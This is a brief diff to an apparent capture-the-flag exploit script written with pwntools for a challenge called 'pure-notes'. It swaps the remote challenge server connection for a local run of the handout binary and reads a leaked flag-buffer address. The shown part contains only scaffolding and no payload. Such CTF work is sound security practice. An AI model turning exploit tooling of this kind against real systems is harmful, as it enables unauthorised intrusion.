@@ -1,8 +1,6 @@
 from pwn import *
 
 context.log_level = 'info'
-HOST = "pure-notes-b109f200db172955-global.challs.brunnerne.xyz"
-PORT = 1337
 SIZE = 128
 OFFSET = 16  
 
@@ -34,7 +32,7 @@ def decode_leaked(raw_utf8_bytes):
 
 
 def main():
-    p = remote(HOST, PORT, ssl=True)
+    p = process("../Handout/Main")
     p.recvuntil(b"program\n")
     target_addr = int(p.recvline().strip(), 16)
     log.success(f"flag buffer address: {hex(target_addr)}")
